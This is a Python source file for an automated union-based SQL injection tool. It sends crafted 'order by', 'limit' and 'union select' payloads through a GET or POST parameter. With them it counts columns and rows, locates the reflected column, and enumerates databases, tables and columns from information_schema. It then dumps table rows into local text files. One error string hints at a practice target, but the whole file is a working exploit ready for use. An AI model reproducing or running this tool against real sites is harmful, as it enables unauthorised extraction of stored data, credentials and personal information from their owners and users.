import Utility

import re
import string
import difflib
import requests


class DT:
    def __init__(self, url, cookie, method, data, parameter, normal):
        self.url = url
        self.cookie = cookie
        self.method = method
        self.data = data
        self.parameter = parameter
        self.normal = normal

        self.column_cnt = 0
        self.row_cnt = 0
        self.pos = 0
        self.res = None
        self.c_lst = list()
        self.r_lst = list()
        self.comp = list()
        self.msg = dict()
        self.title = self.url.rstrip('.php').split('/')[-1]

        self.payload_order = ["wow\' or 1=1 order by ", "\'wow\' or 1=1 order by "]
        self.payload_limit = ["wow\' or 1=1 limit by ", "\'wow\' or 1=1 limit by "]
        self.payload_union = ["wow\' union select ", "\'wow\' union select "]

    def _compare(self, result):
        dif = list(difflib.context_diff(self.comp[0], result))
        val = ""

        for d in dif:
            if '!' in d:
                d = d.replace('! ', '')
                if d == str(self.pos):
                    continue
                val += d

        return val

    def _position(self):
        for p in self.payload_union:
            syntax = p
            for i in self.c_lst:
                syntax += str(i) + ","
            syntax = syntax[:-1] + "#"

            self._message(syntax)
            self._method()

            if "You have an error in your SQL syntax" in self.res.text:
                continue

            self.comp = self._diff()

            dig = int(re.findall("\d+", self.comp[0])[0])
            self.pos = dig

    def _diff(self):
        alp_num = string.ascii_letters + string.digits
        lst = list()

        dif = list(difflib.context_diff(self.normal, self.res.text.splitlines(keepends=True)))
        for d in dif:
            if '!' in d:
                val = ""
                for idx in range(d.find(">") + 1, d.rfind("<")):
                    val += d[idx]
                if any(i in val for i in alp_num):
                    lst.append(val)

        return lst

    def _method(self):
        if self.method.upper() == "GET":
            self.res = requests.get(self.url, cookies=self.cookie, params=self.msg)
        elif self.method.upper() == "POST":
            self.res = requests.post(self.url, cookies=self.cookie, data=self.msg)
        else:
            print("HTTP Method Error!")
            exit()

    def _message(self, syntax):
        for key, value in self.data.items():
            self.msg[key] = value
            if key == self.parameter:
                self.msg[key] = syntax

    def _column(self):
        c_cnt = 0
        for p in self.payload_order:
            cnt = 1
            while True:
                syntax = p + "{}#".format(cnt)

                self._message(syntax)
                self._method()

                if "You have an error in your SQL syntax" in self.res.text or "Unknown column" in self.res.text:
                    break
                cnt += 1

            if c_cnt < cnt:
                c_cnt = cnt - 1

        return c_cnt

    def _row(self):
        r_cnt = 0
        for p in self.payload_limit:
            cnt = 0
            while True:
                syntax = p + "{}#".format(cnt)

                self._message(syntax)
                self._method()

                if "You have an error in your SQL syntax" in self.res.text or "No movies were found!" in self.res.text:
                    break
                cnt += 1

            if r_cnt < cnt:
                r_cnt = cnt

        return r_cnt

    def db(self):
        self.column_cnt = self._column()
        self.c_lst = [i for i in range(1, self.column_cnt+1)]

        self.row_cnt = self._row()
        self.r_lst = [i for i in range(1, self.row_cnt+1)]

        self._position()

        print("\nCheck Database")

        util = Utility.Util('./')
        util.mkdir('Database')
        path = './Database'

        fw = open(path + '/{}.txt'.format(self.title), 'w')

        database = ""
        db_lst = list()

        for p in self.payload_union:
            cnt = 0
            while True:
                query = "select SCHEMA_NAME from information_schema.SCHEMATA limit {},1".format(cnt)
                syntax = p
                for i in self.c_lst:
                    if i == self.pos:
                        syntax += "({})".format(query) + ","
                    else:
                        syntax += str(i) + ","
                syntax = syntax[:-1] + "#"

                self._message(syntax)
                self._method()

                if "You have an error in your SQL syntax" in self.res.text:
                    break

                result = self._diff()
                if len(result) == 1:
                    if self.comp[0].split()[0] != result[0].split()[0]:
                        break
                else:
                    if len(self.comp) != len(result):
                        break

                voc = self._compare(result[0])

                fw.write(voc + '\n')
                db_lst.append(voc)
                cnt += 1

            database = self.db_now()

        fw.write('\nDatabase use in: ' + database + '\n')
        fw.close()

        return db_lst

    def db_now(self):
        database_now = ""
        for p in self.payload_union:
            query = "select database()"

            syntax = p
            for i in self.c_lst:
                if i == self.pos:
                    syntax += "({})".format(query) + ","
                else:
                    syntax += str(i) + ","
            syntax = syntax[:-1] + "#"

            self._message(syntax)
            self._method()

            if "You have an error in your SQL syntax" in self.res.text:
                break

            result = self._diff()

            voc = self._compare(result[0])
            database_now = voc

        return database_now

    def tb(self, database):
        print("\nCheck Table")

        util = Utility.Util('./')
        util.mkdir('Table')
        path = './Table'

        fw = open(path + '/{}_{}.txt'.format(self.title, database), 'w')

        tb_lst = list()
        for p in self.payload_union:
            cnt = 0
            while True:
                query = "select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='{}' limit {},1".format(database, cnt)

                syntax = p
                for i in self.c_lst:
                    if i == self.pos:
                        syntax += "({})".format(query) + ","
                    else:
                        syntax += str(i) + ","
                syntax = syntax[:-1] + "#"

                self._message(syntax)
                self._method()

                if "You have an error in your SQL syntax" in self.res.text:
                    break

                result = self._diff()
                if len(result) == 1:
                    if self.comp[0].split()[0] != result[0].split()[0]:
                        break
                else:
                    if len(self.comp) != len(result):
                        break

                voc = self._compare(result[0])

                fw.write(voc + '\n')
                tb_lst.append(voc)
                cnt += 1

        fw.close()

        return tb_lst

    def dump(self, database, table):
        print("\nDump {} Table".format(table))

        util = Utility.Util('./')
        util.mkdir('Data')
        path = './Data'

        fw = open(path + '/{}_{}_{}.txt'.format(self.title, database, table), 'w')

        lst = list()
        for p in self.payload_union:
            cnt = 0
            while True:
                query = "select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='{}' and TABLE_NAME='{}' limit {},1".format(database, table, cnt)

                syntax = p
                for i in self.c_lst:
                    if i == self.pos:
                        syntax += "({})".format(query) + ","
                    else:
                        syntax += str(i) + ","
                syntax = syntax[:-1] + "#"

                self._message(syntax)
                self._method()

                if "You have an error in your SQL syntax" in self.res.text:
                    break

                result = self._diff()
                if len(result) == 1:
                    if self.comp[0].split()[0] != result[0].split()[0]:
                        break
                else:
                    if len(self.comp) != len(result):
                        break

                voc = self._compare(result[0])

                lst.append(voc)
                cnt += 1

        fw.write('\t'.join(lst) + '\n')

        for p in self.payload_union:
            cnt = 0

            while True:
                flag = True

                if cnt == self.column_cnt:
                    break

                for c in lst:
                    query = "select {} from {} limit {},1".format(c, table, cnt)

                    syntax = p
                    for i in self.c_lst:
                        if i == self.pos:
                            syntax += "({})".format(query) + ","
                        else:
                            syntax += str(i) + ","
                    syntax = syntax[:-1] + "#"

                    self._message(syntax)
                    self._method()

                    if "You have an error in your SQL syntax" in self.res.text:
                        flag = False
                        break

                    result = self._diff()
                    if len(result) == 1:
                        if self.comp[0].split()[0] != result[0].split()[0]:
                            break
                    else:
                        if len(self.comp) != len(result):
                            break

                    voc = self._compare(result[0])

                    fw.write(voc + '\t')

                fw.write('\n')
                cnt += 1

                if flag is False:
                    break

        fw.close()

        fr = open(path + '/{}_{}_{}.txt'.format(self.title, database, table), 'r')
        line = fr.read()
        fr.close()

        return line
